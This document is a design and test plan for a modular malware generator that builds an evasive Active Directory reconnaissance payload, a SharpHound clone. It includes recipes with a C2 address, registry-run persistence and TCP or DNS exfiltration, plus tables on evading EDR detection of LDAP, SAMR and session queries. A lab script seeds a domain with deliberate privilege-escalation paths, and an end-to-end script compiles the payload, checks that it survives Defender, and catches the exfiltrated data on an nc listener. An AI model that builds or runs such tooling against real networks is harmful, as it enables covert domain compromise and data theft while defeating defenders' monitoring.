description: Session collection loop — continuous session monitoring

ad:
  - ad/ldap_client
  - ad/sid_resolver
  - ad/json_builder
  - ad/zip_writer

ad_collectors:
  - ad_collectors/ad_computers
  - ad_collectors/ad_sessions

evasion:
  - evasion/behavioral_pacing
  - evasion/sleep_jitter

exfil: exfil/tcp_direct
persist: persist/registry_run
arch: arch/ad_recon

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  AD_SESSION_LOOP: "1"
  AD_SESSION_INTERVAL: "300"
  AD_SESSION_DURATION: "7200"
```

### 6.6 ad_recon_certservices.yaml — ADCS-Focused

```yaml
name: ad_recon_certservices
description: ADCS recon — certificate templates, CAs, ESC conditions

ad:
  - ad/ldap_client
  - ad/sid_resolver
  - ad/json_builder
  - ad/dacl_parser
  - ad/zip_writer

ad_collectors:
  - ad_collectors/ad_domains
  - ad_collectors/ad_certservices

evasion:
  - evasion/behavioral_pacing
  - evasion/entropy_pad

exfil: exfil/tcp_direct
arch: arch/ad_recon

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
```

---

## 7. Evasion Considerations

### 7.1 LDAP Query Fingerprint Avoidance

SharpHound's LDAP queries are well-documented and fingerprinted by EDRs. Our implementation should differ:

| SharpHound Pattern | Our Approach |
|---|---|
| Page size 500 | Configurable: 200 (stealth), 750 (default), 1000 (fast) |
| Single compound filter for all object types | Split into per-type queries with delays between |
| Requests nTSecurityDescriptor in same query as properties | Two-pass: first get properties, then get SDs in separate query |
| Attributes in specific order | Randomize attribute request order per query |
| All queries back-to-back | Jittered delays between queries (100ms-2s configurable) |
| SDFlags 0x05 always | Use 0x04 (DACL only, skip Owner) where Owner isn't needed |

### 7.2 SAMR Evasion

| Detection | Counter |
|---|---|
| Multiple named pipes from same source in short timeframe | Space out connections: 5-15s per host with jitter |
| SAMR queries to many hosts | Limit to N hosts per run, or only query hosts where user has admin |
| Static import of samlib.dll | Dynamic resolution via GetProcAddress |

### 7.3 Session Enumeration Evasion

| Detection | Counter |
|---|---|
| NetSessionEnum to many hosts rapidly | Throttle: max 1 host/5s in stealth mode |
| IPC$ connections from non-server process | Already looks like a service/admin tool |
| High volume of 4624 events | Limit target set to DCs + file servers in stealth mode |

### 7.4 Binary-Level Evasion

Same as existing infostealer chunks — entropy padding, string encryption, PE timestamp stomping, behavioral pacing. The AD recon binary is just another .exe from the compiler's perspective.

---

## 8. Output Format Details

### 8.1 BloodHound v6 Compatibility

Each JSON file must have:
```json
{
    "data": [ ... entities ... ],
    "meta": {
        "methods": <bitmask>,
        "type": "<entity_type>",
        "count": <number>,
        "version": 6
    }
}
```

The `methods` bitmask encodes which collection methods were used:
- Group = 1, Session = 2, LoggedOn = 4, Trusts = 8, ACL = 16, ObjectProps = 32
- Container = 64, GPOLocalGroup = 128, LocalAdmin = 256, RDP = 512, DCOM = 1024
- PSRemote = 2048, SPNTargets = 4096, DCOnly = 8192, CertServices = 16384
- CARegistry = 32768, DCRegistry = 65536
- Default (Group+Session+Trusts+ACL+ObjectProps+Container+GPOLocalGroup+LocalGroup) = 127679

### 8.2 Exfil Options

1. **TCP exfil** (default): Send the ZIP blob to C2 via existing `exfil/tcp_direct`. C2 listener saves as `.zip` — ready for BloodHound import.
2. **DNS exfil** (stealth): Split ZIP into chunks, base64-encode, send as DNS TXT queries. Slow but avoids direct TCP connection.
3. **Disk write** (offline): Write ZIP to `%TEMP%\<timestamp>_BloodHound.zip`. Operator retrieves manually. Best for air-gapped networks.
4. **C2 beacon** (backdoor integration): If combined with a backdoor recipe, stream JSON over the bidirectional C2 channel.

---

## 9. Implementation Priority Order

1. **ad/ldap_client.c** + **ad/json_builder.c** — foundation, everything depends on these
2. **ad_collectors/ad_domains.c** — simplest collector (single object), validates the pipeline end-to-end
3. **ad_collectors/ad_users.c** + **ad/sid_resolver.c** — most important data
4. **ad_collectors/ad_groups.c** — membership edges
5. **ad_collectors/ad_computers.c** — computer list for session/localgroup collectors
6. **arch/ad_recon.c** + **ad/zip_writer.c** — arch template + output
7. **ad/dacl_parser.c** + **ad_collectors/ad_ous.c** + **ad_collectors/ad_gpos.c** — ACL data
8. **ad/samr_client.c** + **ad_collectors/ad_localgroups.c** — SMB-based enumeration
9. **ad_collectors/ad_sessions.c** — session data
10. **ad_collectors/ad_certservices.c** — ADCS (last, most complex)

**Estimated effort**: ~40-60 hours total. Core infrastructure (items 1-6): ~15-20h. Full feature parity (all items): ~40-60h.

---

# PART 2: VM Test Environment Setup & Validation

## 1. AD Test Environment Options

### Option A: Promote Existing VM to Domain Controller (**RECOMMENDED**)

**Pros**: Single VM, fastest to set up, no networking complexity, uses existing QEMU infra.
**Cons**: VM becomes a DC (changes behavior), can't test computer-to-computer enumeration (only 1 host), less realistic.
**Setup time**: ~30 minutes.

### Option B: Add Second VM as DC, Join Existing VM

**Pros**: Realistic — DC + workstation, can test session/localgroup enumeration between hosts.
**Cons**: Needs second QEMU VM (more RAM/CPU), NAT networking between VMs, more setup.
**Setup time**: ~2-3 hours.

### Option C: Pre-built AD Lab (DVAD / BadBlood)

**Pros**: Realistic AD population (hundreds of objects with interesting relationships).
**Cons**: Still need a DC VM first; these tools populate an existing AD.
**Setup time**: 1-2 hours (after DC is up).

### Recommendation: Option A (single DC) + BadBlood for population

Start with Option A for fastest iteration. Our VM becomes a DC with AD DS installed. Populate with BadBlood to create realistic objects. We lose computer-to-computer SMB testing, but DCOnly collection (the MVP) only talks to the DC anyway. Add a second VM later when testing session/localgroup enumeration.

---

## 2. AD Lab Setup Script

### scripts/setup_ad_lab.ps1

```powershell
# ============================================================
# setup_ad_lab.ps1 — Promote VM to DC + populate test AD
# Run as Administrator on the Windows 11 VM
# REQUIRES REBOOT after AD DS installation
# ============================================================

param(
    [string]$DomainName = "malgen.local",
    [string]$NetBIOSName = "MALGEN",
    [string]$SafeModePwd = "P@ssw0rd!Lab2024",
    [switch]$SkipPromotion,
    [switch]$PopulateOnly
)

$ErrorActionPreference = "Stop"

# ---- Phase 1: Install AD DS Role ----
if (-not $SkipPromotion -and -not $PopulateOnly) {
    Write-Host "[1/4] Installing AD DS role..."
    Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools -ErrorAction Stop

    Write-Host "[2/4] Promoting to Domain Controller..."
    $secPwd = ConvertTo-SecureString $SafeModePwd -AsPlainText -Force
    Install-ADDSForest `
        -DomainName $DomainName `
        -DomainNetBIOSName $NetBIOSName `
        -SafeModeAdministratorPassword $secPwd `
        -InstallDNS `
        -Force `
        -NoRebootOnCompletion

    Write-Host "[!] REBOOT REQUIRED. After reboot, run with -SkipPromotion to continue setup."
    Write-Host "    Reboot command: shutdown /r /t 10"
    exit 0
}

# ---- Phase 2: Verify DC is running ----
Write-Host "[*] Verifying AD DS is operational..."
$dc = Get-ADDomainController -ErrorAction Stop
Write-Host "    DC: $($dc.HostName) Domain: $($dc.Domain)"

# ---- Phase 3: Create OU Structure ----
Write-Host "[3/4] Creating OU structure..."
$ouDefs = @(
    "OU=Corporate,$((Get-ADDomain).DistinguishedName)",
    "OU=IT,OU=Corporate,$((Get-ADDomain).DistinguishedName)",
    "OU=Finance,OU=Corporate,$((Get-ADDomain).DistinguishedName)",
    "OU=HR,OU=Corporate,$((Get-ADDomain).DistinguishedName)",
    "OU=Engineering,OU=Corporate,$((Get-ADDomain).DistinguishedName)",
    "OU=Servers,OU=Corporate,$((Get-ADDomain).DistinguishedName)",
    "OU=Workstations,OU=Corporate,$((Get-ADDomain).DistinguishedName)",
    "OU=Service Accounts,OU=Corporate,$((Get-ADDomain).DistinguishedName)",
    "OU=Disabled,OU=Corporate,$((Get-ADDomain).DistinguishedName)"
)
foreach ($ou in $ouDefs) {
    $name = ($ou -split ",")[0] -replace "OU=",""
    $parent = ($ou -split ",",2)[1]
    try {
        New-ADOrganizationalUnit -Name $name -Path $parent -ProtectedFromAccidentalDeletion $false
        Write-Host "    Created: $ou"
    } catch { Write-Host "    Exists: $ou" }
}

# ---- Phase 4: Populate AD Objects ----
Write-Host "[4/4] Creating test AD objects..."

$domainDN = (Get-ADDomain).DistinguishedName
$defaultPwd = ConvertTo-SecureString "Summer2024!" -AsPlainText -Force

# --- Users ---
$users = @(
    # Standard users
    @{Name="John Smith";     SAM="jsmith";      OU="OU=IT,OU=Corporate"},
    @{Name="Jane Doe";       SAM="jdoe";        OU="OU=Finance,OU=Corporate"},
    @{Name="Bob Wilson";     SAM="bwilson";      OU="OU=HR,OU=Corporate"},
    @{Name="Alice Chen";     SAM="achen";        OU="OU=Engineering,OU=Corporate"},
    @{Name="Charlie Brown";  SAM="cbrown";       OU="OU=Engineering,OU=Corporate"},
    @{Name="David Kim";      SAM="dkim";         OU="OU=IT,OU=Corporate"},
    @{Name="Eve Martinez";   SAM="emartinez";    OU="OU=Finance,OU=Corporate"},
    @{Name="Frank Garcia";   SAM="fgarcia";      OU="OU=HR,OU=Corporate"},

    # Admin accounts
    @{Name="IT Admin";       SAM="itadmin";      OU="OU=IT,OU=Corporate"},
    @{Name="Server Admin";   SAM="srvadmin";     OU="OU=IT,OU=Corporate"},

    # Service accounts (with SPNs for Kerberoasting)
    @{Name="SQL Service";    SAM="svc_sql";      OU="OU=Service Accounts,OU=Corporate"; SPN="MSSQLSvc/sql01.malgen.local:1433"},
    @{Name="Web Service";    SAM="svc_web";      OU="OU=Service Accounts,OU=Corporate"; SPN="HTTP/web01.malgen.local"},
    @{Name="Backup Service"; SAM="svc_backup";   OU="OU=Service Accounts,OU=Corporate"; SPN="cifs/backup01.malgen.local"},

    # Disabled account
    @{Name="Former Employee"; SAM="former";      OU="OU=Disabled,OU=Corporate"; Disabled=$true},

    # Delegation accounts
    @{Name="Deleg User";     SAM="deleg_user";   OU="OU=IT,OU=Corporate"; Delegation="cifs/dc01.malgen.local"}
)

foreach ($u in $users) {
    $path = "$($u.OU),$domainDN"
    $parts = $u.Name -split " "
    try {
        $params = @{
            Name              = $u.Name
            SamAccountName    = $u.SAM
            UserPrincipalName = "$($u.SAM)@$DomainName"
            GivenName         = $parts[0]
            Surname           = if ($parts.Count -gt 1) { $parts[1] } else { "" }
            Path              = $path
            AccountPassword   = $defaultPwd
            Enabled           = (-not $u.Disabled)
            PasswordNeverExpires = $true
        }
        New-ADUser @params
        Write-Host "    User: $($u.SAM)"

        if ($u.SPN) {
            Set-ADUser -Identity $u.SAM -ServicePrincipalNames @{Add=$u.SPN}
            Write-Host "      SPN: $($u.SPN)"
        }
        if ($u.Delegation) {
            Set-ADUser -Identity $u.SAM -TrustedForDelegation $true
            Set-ADObject -Identity "CN=$($u.Name),$path" -Add @{
                'msDS-AllowedToDelegateTo' = $u.Delegation
            }
            Write-Host "      Delegation: $($u.Delegation)"
        }
    } catch { Write-Host "    Exists/Error: $($u.SAM) — $_" }
}

# --- Groups ---
$groups = @(
    @{Name="IT Admins";       SAM="IT_Admins";       Scope="Global";      Members=@("itadmin","srvadmin","dkim")},
    @{Name="Database Admins"; SAM="DB_Admins";        Scope="Global";      Members=@("srvadmin","svc_sql")},
    @{Name="Server Operators";SAM="Server_Operators";  Scope="DomainLocal"; Members=@("IT_Admins")},
    @{Name="Finance Team";    SAM="Finance_Team";      Scope="Global";      Members=@("jdoe","emartinez")},
    @{Name="All Engineers";   SAM="All_Engineers";     Scope="Global";      Members=@("achen","cbrown")},
    @{Name="Help Desk";       SAM="Help_Desk";         Scope="Global";      Members=@("jsmith")},
    @{Name="Backup Operators Ext"; SAM="Backup_Ops";   Scope="Global";      Members=@("svc_backup")}
)

foreach ($g in $groups) {
    try {
        New-ADGroup -Name $g.Name -SamAccountName $g.SAM -GroupScope $g.Scope `
            -GroupCategory Security -Path "OU=Corporate,$domainDN"
        Write-Host "    Group: $($g.SAM)"
        foreach ($m in $g.Members) {
            try { Add-ADGroupMember -Identity $g.SAM -Members $m }
            catch { Write-Host "      Couldn't add $m to $($g.SAM)" }
        }
    } catch { Write-Host "    Exists: $($g.SAM)" }
}

# Nest: IT_Admins → Domain Admins (creates privilege escalation path)
try { Add-ADGroupMember -Identity "Domain Admins" -Members "itadmin" } catch {}

# --- Computer Objects ---
$computers = @("WS01","WS02","WS03","SRV-SQL01","SRV-WEB01","SRV-FILE01","SRV-BACKUP01")
foreach ($c in $computers) {
    try {
        New-ADComputer -Name $c -SamAccountName "$c$" `
            -Path "OU=$(if($c -like 'SRV*'){'Servers'}else{'Workstations'}),OU=Corporate,$domainDN" `
            -Enabled $true
        Write-Host "    Computer: $c"
    } catch { Write-Host "    Exists: $c" }
}

# --- GPOs ---
try {
    $gpo1 = New-GPO -Name "Workstation Security"
    New-GPLink -Name "Workstation Security" -Target "OU=Workstations,OU=Corporate,$domainDN" -LinkEnabled Yes
    Write-Host "    GPO: Workstation Security → Workstations"
} catch { Write-Host "    GPO exists" }

try {
    $gpo2 = New-GPO -Name "Server Hardening"
    New-GPLink -Name "Server Hardening" -Target "OU=Servers,OU=Corporate,$domainDN" -LinkEnabled Yes
    Write-Host "    GPO: Server Hardening → Servers"
} catch { Write-Host "    GPO exists" }

# --- Interesting ACLs (create attack paths) ---

# Give Help_Desk ForceChangePassword on all users in HR OU
$hrOU = "OU=HR,OU=Corporate,$domainDN"
$helpDeskSID = (Get-ADGroup "Help_Desk").SID
$acl = Get-Acl "AD:$hrOU"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $helpDeskSID,
    "ExtendedRight",
    "Allow",
    [Guid]"00299570-246d-11d0-a768-00aa006e0529",  # Reset Password extended right
    "Descendents",
    [Guid]"bf967aba-0de6-11d0-a285-00aa003049e2"   # User object class
)
$acl.AddAccessRule($rule)
Set-Acl "AD:$hrOU" $acl
Write-Host "    ACL: Help_Desk → ForceChangePassword on HR users"

# Give jsmith GenericAll on svc_sql (attack path: jsmith → svc_sql → SQL servers)
$svcSqlDN = (Get-ADUser "svc_sql").DistinguishedName
$jsmithSID = (Get-ADUser "jsmith").SID
$acl2 = Get-Acl "AD:$svcSqlDN"
$rule2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $jsmithSID,
    "GenericAll",
    "Allow"
)
$acl2.AddAccessRule($rule2)
Set-Acl "AD:$svcSqlDN" $acl2
Write-Host "    ACL: jsmith → GenericAll on svc_sql"

# Give Finance_Team WriteSPN on svc_web (Kerberoasting path)
$svcWebDN = (Get-ADUser "svc_web").DistinguishedName
$financeSID = (Get-ADGroup "Finance_Team").SID
$acl3 = Get-Acl "AD:$svcWebDN"
$rule3 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $financeSID,
    "WriteProperty",
    "Allow",
    [Guid]"f3a64788-5306-11d1-a9c5-0000f80367c1",  # SPN attribute
    "None"
)
$acl3.AddAccessRule($rule3)
Set-Acl "AD:$svcWebDN" $acl3
Write-Host "    ACL: Finance_Team → WriteSPN on svc_web"

# --- Summary ---
Write-Host ""
Write-Host "=============================================="
Write-Host "AD Lab Setup Complete"
Write-Host "=============================================="
Write-Host "Domain:     $DomainName"
Write-Host "Users:      $(Get-ADUser -Filter * | Measure-Object | Select -Expand Count)"
Write-Host "Groups:     $(Get-ADGroup -Filter * | Measure-Object | Select -Expand Count)"
Write-Host "Computers:  $(Get-ADComputer -Filter * | Measure-Object | Select -Expand Count)"
Write-Host "OUs:        $(Get-ADOrganizationalUnit -Filter * | Measure-Object | Select -Expand Count)"
Write-Host "GPOs:       $(Get-GPO -All | Measure-Object | Select -Expand Count)"
Write-Host ""
Write-Host "Expected BloodHound Attack Paths:"
Write-Host "  jsmith → GenericAll → svc_sql → MSSQLSvc SPN → SQL Server"
Write-Host "  Help_Desk → ForceChangePassword → HR users"
Write-Host "  Finance_Team → WriteSPN → svc_web → Kerberoasting"
Write-Host "  itadmin → Domain Admins (direct member)"
Write-Host "  deleg_user → Constrained Delegation → DC"
Write-Host ""
Write-Host "Run SharpHound baseline:  .\SharpHound.exe -c All --NoZip"
Write-Host "Or our tool:             payload.exe"
```

### Phase 1 vs Phase 2 Execution

The script requires a reboot between AD DS installation and population:

```bash
# From host — Phase 1: Install AD DS + promote
sshpass -p 'vmuser123' ssh -p 10022 vmuser@localhost \
    'powershell -ExecutionPolicy Bypass -File C:\Users\vmuser\setup_ad_lab.ps1'
# VM reboots automatically

# Wait for VM to come back
sleep 120
# Phase 2: Populate
sshpass -p 'vmuser123' ssh -p 10022 vmuser@localhost \
    'powershell -ExecutionPolicy Bypass -File C:\Users\vmuser\setup_ad_lab.ps1 -SkipPromotion'
```

---

## 3. Additional Population: BadBlood (Optional)

For a more realistic AD with hundreds of objects and complex relationships:

```powershell
# Download and run BadBlood
Invoke-WebRequest -Uri "https://github.com/davidprowe/BadBlood/archive/refs/heads/master.zip" `
    -OutFile "$env:TEMP\BadBlood.zip"
Expand-Archive "$env:TEMP\BadBlood.zip" -DestinationPath "$env:TEMP\BadBlood"
cd "$env:TEMP\BadBlood\BadBlood-master"
.\Invoke-BadBlood.ps1
```

BadBlood creates ~2500 users, ~500 groups, ~100 computers with realistic naming, nested groups, delegation, SPNs, and ACLs. It takes ~10-15 minutes to run.

---

## 4. Validation Framework

### 4.1 Baseline: Run Real SharpHound

Before testing our tool, capture a SharpHound baseline on the same AD:

```bash
# Upload SharpHound to VM
sshpass -p 'vmuser123' scp -P 10022 \
    tools/SharpHound.exe vmuser@localhost:'C:\Users\vmuser\SharpHound.exe'

# Run SharpHound with all methods + no zip (raw JSON)
sshpass -p 'vmuser123' ssh -p 10022 vmuser@localhost \
    'C:\Users\vmuser\SharpHound.exe -c All --NoZip --OutputDirectory C:\Users\vmuser\bh_baseline'

# Download baseline
sshpass -p 'vmuser123' scp -r -P 10022 \
    vmuser@localhost:'C:\Users\vmuser\bh_baseline\*' results/bh_baseline/
```

### 4.2 Schema Validation Script

**scripts/validate_bloodhound.py**

```python
#!/usr/bin/env python3
"""Validate BloodHound v6 JSON output against schema and optionally compare with baseline."""

import json
import sys
import zipfile
from pathlib import Path

REQUIRED_TYPES = {"users", "groups", "computers", "domains", "gpos", "ous"}

ENTITY_REQUIRED_FIELDS = {
    "users": ["ObjectIdentifier", "Properties", "Aces"],
    "groups": ["ObjectIdentifier", "Properties", "Members", "Aces"],
    "computers": ["ObjectIdentifier", "Properties", "Aces"],
    "domains": ["ObjectIdentifier", "Properties", "Trusts", "Links", "ChildObjects", "Aces"],
    "gpos": ["ObjectIdentifier", "Properties", "Aces"],
    "ous": ["ObjectIdentifier", "Properties", "Links", "ChildObjects", "Aces"],
}

PROPERTY_REQUIRED = {
    "users": ["name", "domain", "domainsid", "enabled"],
    "groups": ["name", "domain"],
    "computers": ["name", "domain"],
    "domains": ["name", "domain", "functionallevel"],
    "gpos": ["name", "domain"],
    "ous": ["name", "domain"],
}


def validate_file(path, entity_type):
    """Validate a single JSON file. Returns (pass, errors, stats)."""
    errors = []
    stats = {}

    try:
        data = json.loads(Path(path).read_text())
    except json.JSONDecodeError as e:
        return False, [f"Invalid JSON: {e}"], {}

    if "data" not in data:
        errors.append("Missing 'data' key")
    if "meta" not in data:
        errors.append("Missing 'meta' key")
    else:
        meta = data["meta"]
        if meta.get("version") != 6:
            errors.append(f"Expected version 6, got {meta.get('version')}")
        if meta.get("type") != entity_type:
            errors.append(f"Expected type '{entity_type}', got '{meta.get('type')}'")
        stats["count_meta"] = meta.get("count", 0)

    entities = data.get("data", [])
    stats["count_actual"] = len(entities)

    if stats.get("count_meta", 0) != len(entities):
        errors.append(f"Meta count ({stats.get('count_meta')}) != actual count ({len(entities)})")

    req_fields = ENTITY_REQUIRED_FIELDS.get(entity_type, [])
    req_props = PROPERTY_REQUIRED.get(entity_type, [])

    for i, entity in enumerate(entities[:5]):  # Check first 5
        for field in req_fields:
            if field not in entity:
                errors.append(f"Entity {i}: missing field '{field}'")
        if "Properties" in entity:
            for prop in req_props:
                if prop not in entity["Properties"]:
                    errors.append(f"Entity {i}: missing property '{prop}'")
        if "ObjectIdentifier" in entity:
            oid = entity["ObjectIdentifier"]
            if not oid.startswith("S-1-5-") and len(oid) < 10:
                errors.append(f"Entity {i}: suspicious ObjectIdentifier '{oid}'")

    return len(errors) == 0, errors, stats


def validate_zip(zip_path):
    """Validate a BloodHound ZIP archive."""
    results = {}
    with zipfile.ZipFile(zip_path) as zf:
        found_types = set()
        for name in zf.namelist():
            for t in REQUIRED_TYPES:
                if t in name.lower() and name.endswith(".json"):
                    found_types.add(t)
                    tmp = Path(f"/tmp/bh_validate_{t}.json")
                    tmp.write_bytes(zf.read(name))
                    ok, errs, stats = validate_file(tmp, t)
                    results[t] = {"pass": ok, "errors": errs, "stats": stats}
                    tmp.unlink()

        missing = REQUIRED_TYPES - found_types
        if missing:
            for m in missing:
                results[m] = {"pass": False, "errors": [f"File not found in ZIP"], "stats": {}}

    return results


def compare_with_baseline(our_results, baseline_dir):
    """Compare entity counts with SharpHound baseline."""
    comparisons = {}
    baseline_path = Path(baseline_dir)
    for t in REQUIRED_TYPES:
        baseline_files = list(baseline_path.glob(f"*_{t}.json"))
        if not baseline_files:
            comparisons[t] = {"baseline": "N/A", "ours": our_results.get(t, {}).get("stats", {}).get("count_actual", 0)}
            continue
        baseline_data = json.loads(baseline_files[0].read_text())
        bl_count = len(baseline_data.get("data", []))
        our_count = our_results.get(t, {}).get("stats", {}).get("count_actual", 0)
        diff_pct = abs(bl_count - our_count) / max(bl_count, 1) * 100
        comparisons[t] = {
            "baseline": bl_count,
            "ours": our_count,
            "diff_pct": f"{diff_pct:.1f}%",
            "match": diff_pct < 5
        }
    return comparisons


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <output.zip|output_dir> [baseline_dir]")
        sys.exit(1)

    target = sys.argv[1]
    baseline = sys.argv[2] if len(sys.argv) > 2 else None

    if target.endswith(".zip"):
        results = validate_zip(target)
    else:
        results = {}
        for t in REQUIRED_TYPES:
            files = list(Path(target).glob(f"*_{t}.json"))
            if files:
                ok, errs, stats = validate_file(files[0], t)
                results[t] = {"pass": ok, "errors": errs, "stats": stats}
            else:
                results[t] = {"pass": False, "errors": ["File not found"], "stats": {}}

    # Print results
    print("\n=== BloodHound Output Validation ===\n")
    all_pass = True
    for t, r in sorted(results.items()):
        status = "PASS" if r["pass"] else "FAIL"
        count = r["stats"].get("count_actual", "?")
        print(f"  {t:12s}: {status:4s}  ({count} entities)")
        if not r["pass"]:
            all_pass = False
            for e in r["errors"][:3]:
                print(f"               ERROR: {e}")

    if baseline:
        comparisons = compare_with_baseline(results, baseline)
        print("\n=== Baseline Comparison ===\n")
        for t, c in sorted(comparisons.items()):
            match = "OK" if c.get("match", False) else "DIFF"
            print(f"  {t:12s}: ours={c['ours']:4}  baseline={str(c['baseline']):4}  {c.get('diff_pct','N/A'):>6s}  [{match}]")

    print(f"\nOverall: {'PASS' if all_pass else 'FAIL'}")
    sys.exit(0 if all_pass else 1)
```

### 4.3 BloodHound Import Test

The strongest validation: import our output into BloodHound and query known attack paths.

```bash
# Install BloodHound CE (Docker)
docker compose -f bloodhound-docker-compose.yml up -d

# Upload our ZIP via API
curl -X POST http://localhost:8080/api/v2/file-upload/start \
    -H "Authorization: Bearer $BH_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"fileName":"test_upload.zip"}'

# After upload completes, query for known attack paths:
# "Shortest path from jsmith to Domain Admins"
curl http://localhost:8080/api/v2/graphs/shortest-path \
    -H "Authorization: Bearer $BH_TOKEN" \
    -d '{"start":"JSMITH@MALGEN.LOCAL","end":"DOMAIN ADMINS@MALGEN.LOCAL"}'

# Expected path: jsmith → GenericAll → svc_sql → (Kerberoast) → DA
# If this path exists in the graph, our data is correct.
```

---

## 5. Defender/Elastic Detection Testing

### 5.1 Event Monitoring Setup

Enable AD audit events on the DC before testing:

```powershell
# Enable DS Access auditing (for 4662 events)
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable

# Enable Object Access auditing (for 5140/5145 events)
auditpol /set /subcategory:"File Share" /success:enable
auditpol /set /subcategory:"Detailed File Share" /success:enable

# Enable Logon auditing (for 4624 events)
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
```

### 5.2 Detection Baseline: SharpHound

Run real SharpHound and capture all security events:

```powershell
# Clear event logs
wevtutil cl Security

# Run SharpHound
.\SharpHound.exe -c All

# Capture events
$events = Get-WinEvent -LogName Security -MaxEvents 10000 |
    Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-5) }

# Count by event ID
$events | Group-Object Id | Sort-Object Count -Descending |
    Format-Table Count, Name -AutoSize

# Save for comparison
$events | Select-Object TimeCreated, Id, Message |
    Export-Csv C:\Users\vmuser\sharphound_events.csv
```

Expected events from SharpHound:
- Many 4662 (Directory Service Access)
- Many 5145 (Detailed File Share — named pipe access)
- 4624 (Logon) for each LDAP/SMB connection
- Possible Defender alert (HackTool:MSIL/SharpHound)

### 5.3 Detection Test: Our Tool

```powershell
# Clear events
wevtutil cl Security

# Run our tool
.\payload.exe

# Capture and compare
$our_events = Get-WinEvent -LogName Security -MaxEvents 10000 |
    Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-5) }

$our_events | Group-Object Id | Sort-Object Count -Descending |
    Format-Table Count, Name -AutoSize

# Compare counts
$our_count = ($our_events | Where-Object { $_.Id -eq 4662 }).Count
$sh_count = ($sharphound_events | Where-Object { $_.Id -eq 4662 }).Count
Write-Host "4662 events: SharpHound=$sh_count  Ours=$our_count"
```

### 5.4 Defender Detection Check

```powershell
# Check Defender detections
Get-MpThreatDetection | Select-Object -Last 10 | Format-List

# Check Defender quarantine
Get-MpThreat | Format-List

# Check binary still exists
Test-Path C:\Users\vmuser\Desktop\payload.exe
```

### 5.5 Wazuh Integration

If Wazuh is installed on the DC, it provides additional detection visibility:

```bash
# Install Wazuh agent on DC (from host)
sshpass -p 'vmuser123' ssh -p 10022 vmuser@localhost \
    'powershell -Command "Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.2-1.msi -OutFile C:\Users\vmuser\wazuh-agent.msi; Start-Process msiexec.exe -ArgumentList \"/i C:\Users\vmuser\wazuh-agent.msi /q WAZUH_MANAGER=10.0.2.2\" -Wait; Start-Service WazuhSvc"'

# On host — install Wazuh manager (Docker)
docker run -d --name wazuh-manager -p 1514:1514 -p 1515:1515 -p 55000:55000 \
    wazuh/wazuh-manager:4.9.2

# Query alerts after running our tool
curl -u wazuh-wui:MyS3cr3tP4ssw0rd* \
    "https://localhost:55000/alerts?limit=20&sort=-timestamp" | python3 -m json.tool
```

Wazuh rules to watch for:
- Rule 60106: LDAP search request
- Rule 18100: Multiple authentication failures
- Rule 60012: Windows audit policy change
- Custom rules for SAMR enumeration patterns

---

## 6. End-to-End Test Script

### scripts/test_ad_recon.sh

```bash
#!/bin/bash
# test_ad_recon.sh — Build, deploy, validate AD recon tool
set -e

RECIPE="${1:-ad_recon_dconly}"
C2_PORT="${C2_PORT:-9001}"
VM_PORT=10022
VM_USER=vmuser
VM_PASS=vmuser123
SSH="sshpass -p '$VM_PASS' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $VM_PORT $VM_USER@localhost"
SCP="sshpass -p '$VM_PASS' scp -o StrictHostKeyChecking=no -P $VM_PORT"

echo "╔══════════════════════════════════════╗"
echo "║     AD RECON VALIDATION SCRIPT       ║"
echo "╚══════════════════════════════════════╝"
echo "Recipe: $RECIPE"
echo ""

# 1. Assemble + compile
echo "▸ [1/7] Assembling from recipe..."
python3 templates/chunks/assembler.py "templates/chunks/recipes/${RECIPE}.yaml" \
    -o /tmp/ad_recon.c --compile --var C2_IP=10.0.2.2 --var C2_PORT=$C2_PORT

if [ ! -f /tmp/ad_recon.exe ]; then
    echo "  ✗ Compilation failed"
    exit 1
fi
echo "  ✓ Compiled: $(stat -c%s /tmp/ad_recon.exe) bytes"

# 2. Upload
echo "▸ [2/7] Uploading to VM..."
eval $SCP /tmp/ad_recon.exe "$VM_USER@localhost:'C:\\Users\\$VM_USER\\Desktop\\payload.exe'" 2>/dev/null
echo "  ✓ Uploaded"

# 3. Check Defender didn't quarantine
echo "▸ [3/7] Checking Defender..."
sleep 3
EXISTS=$(eval $SSH "'if exist C:\\Users\\$VM_USER\\Desktop\\payload.exe (echo EXISTS) else (echo GONE)'" 2>/dev/null | tr -d '\r')
if [ "$EXISTS" = "GONE" ]; then
    echo "  ✗ QUARANTINED"
    eval $SSH "'powershell -Command \"Get-MpThreatDetection | Select-Object -Last 1\"'" 2>/dev/null
    exit 2
fi
echo "  ✓ Survived Defender"

# 4. Start C2 listener
echo "▸ [4/7] Starting C2 listener..."
OUTFILE="/tmp/ad_recon_capture_$(date +%Y%m%d_%H%M%S).zip"
fuser -k $C2_PORT/tcp 2>/dev/null || true
timeout 120 nc -l -p $C2_PORT > "$OUTFILE" &
C2_PID=$!
sleep 1

# 5. Execute
echo "▸ [5/7] Executing on VM..."
eval $SSH "'cmd /c \"C:\\Users\\$VM_USER\\Desktop\\payload.exe\"'" >/dev/null 2>&1 &
wait $C2_PID 2>/dev/null || true

# 6. Validate output
echo "▸ [6/7] Validating output..."
SIZE=$(stat -c%s "$OUTFILE" 2>/dev/null || echo 0)
echo "  Received: $SIZE bytes"

if [ "$SIZE" -lt 100 ]; then
    echo "  ✗ No data received"
    exit 3
fi

# Try to validate as ZIP
python3 scripts/validate_bloodhound.py "$OUTFILE" results/bh_baseline/ 2>/dev/null
BH_RESULT=$?

# 7. Check Defender post-execution
echo "▸ [7/7] Post-execution Defender check..."
DETECTIONS=$(eval $SSH "'powershell -Command \"(Get-MpThreatDetection | Where-Object { \$_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) }).Count\"'" 2>/dev/null | tr -d '\r')
echo "  Detections in last 5 min: ${DETECTIONS:-0}"

